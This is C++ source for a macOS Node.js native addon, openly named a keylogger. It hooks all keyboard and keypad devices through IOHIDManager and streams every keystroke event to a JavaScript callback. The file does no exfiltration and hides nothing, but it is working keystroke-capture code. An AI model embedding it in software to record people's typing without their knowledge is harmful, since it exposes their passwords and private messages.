#include <nan.h>
#include <unistd.h>

#include <list>

typedef struct {
  uint32_t usage;
  char value1;
  char value2;
  char value3;
  char value4;
  char value5;
  char value6;
  char value7;
  char value8;
} KeyEvent;

std::list<KeyEvent> keyEvents;

using namespace Nan;

#include <IOKit/hid/IOHIDValue.h>
#include <IOKit/hid/IOHIDManager.h>

void myHIDKeyboardCallback( void* context,  IOReturn result,  void* sender,  IOHIDValueRef value ) {
  IOHIDElementRef elem = IOHIDValueGetElement( value );
  uint32_t usagePage = IOHIDElementGetUsagePage(elem);
  if (usagePage != 0x07) {
    return;
  }

  uint32_t usage = IOHIDElementGetUsage( elem );

  uint64_t longValue = IOHIDValueGetIntegerValue( value );
  char value1 = (int)((longValue >> 56) & 0xFF);
  char value2 = (int)((longValue >> 48) & 0xFF);
  char value3 = (int)((longValue >> 40) & 0XFF);
  char value4 = (int)((longValue >> 32) & 0XFF);
  char value5 = (int)((longValue >> 24) & 0xFF);
  char value6 = (int)((longValue >> 16) & 0xFF);
  char value7 = (int)((longValue >> 8) & 0XFF);
  char value8 = (int)((longValue & 0XFF));

  KeyEvent event = {usage, value1, value2, value3, value4, value5, value6, value7, value8};
  keyEvents.push_back(event);
}

CFMutableDictionaryRef myCreateDeviceMatchingDictionary( UInt32 usagePage,  UInt32 usage ) {
  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0
    , & kCFTypeDictionaryKeyCallBacks
    , & kCFTypeDictionaryValueCallBacks );
  if ( ! dict ) {
    return NULL;
  }
  CFNumberRef pageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usagePage );
  if ( ! pageNumberRef ) {
    CFRelease( dict );
    return NULL;
  }
  CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsagePageKey), pageNumberRef );
  CFRelease( pageNumberRef );
  CFNumberRef usageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usage );
  if ( ! usageNumberRef ) {
    CFRelease( dict );
    return NULL;
  }
  CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsageKey), usageNumberRef );
  CFRelease( usageNumberRef );
  return dict;
}

class KeyloggerWorker : public AsyncProgressWorker {
 public:
  KeyloggerWorker(Callback *callback, Callback *progress)
    : AsyncProgressWorker(callback), progress(progress) {
      this->hidManager = IOHIDManagerCreate( kCFAllocatorDefault, kIOHIDOptionsTypeNone );
      CFArrayRef matches;
      {
        CFMutableDictionaryRef keyboard = myCreateDeviceMatchingDictionary( 0x01, 6 );
        CFMutableDictionaryRef keypad   = myCreateDeviceMatchingDictionary( 0x01, 7 );
        CFMutableDictionaryRef matchesList[] = { keyboard, keypad };
        matches = CFArrayCreate( kCFAllocatorDefault, (const void **)matchesList, 2, NULL );
      }
      IOHIDManagerSetDeviceMatchingMultiple( this->hidManager, matches );
    }

  ~KeyloggerWorker() {
    //TODO Cleanup
  }

  void Execute (const AsyncProgressWorker::ExecutionProgress& progress) {
    IOHIDManagerRegisterInputValueCallback( this->hidManager, myHIDKeyboardCallback, NULL);
    IOHIDManagerScheduleWithRunLoop( this->hidManager, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode );
    IOHIDManagerOpen( this->hidManager, kIOHIDOptionsTypeNone );

    while(true) {
      CFRunLoopRunInMode(kCFRunLoopDefaultMode, 60, TRUE);
      while (!keyEvents.empty()) {
        KeyEvent event = keyEvents.front();
        progress.Send(reinterpret_cast<const char*>(&event), sizeof(KeyEvent));
        keyEvents.pop_front();
      }
    }
  }

  void HandleProgressCallback(const char *data, size_t size) {
    Nan::HandleScope scope;
    KeyEvent event = *reinterpret_cast<KeyEvent*>(const_cast<char*>(data));
    v8::Local<v8::Value> argv[] = {
      New<v8::Int32>(event.usage),
      New<v8::Number>(event.value1),
      New<v8::Number>(event.value2),
      New<v8::Number>(event.value3),
      New<v8::Number>(event.value4),
      New<v8::Number>(event.value5),
      New<v8::Number>(event.value6),
      New<v8::Number>(event.value7),
      New<v8::Number>(event.value8)
    };
    progress->Call(9, argv);
  }

 private:
  Callback *progress;
  IOHIDManagerRef hidManager;
};

NAN_METHOD(Listen) {
  Callback *progress = new Callback(info[0].As<v8::Function>());
  Callback *callback = new Callback(info[0].As<v8::Function>());
  AsyncQueueWorker(new KeyloggerWorker(callback, progress));
}

NAN_MODULE_INIT(Init) {
  Set(target
    , New<v8::String>("listen").ToLocalChecked()
    , New<v8::FunctionTemplate>(Listen)->GetFunction());
}

NODE_MODULE(my_addon, Init)
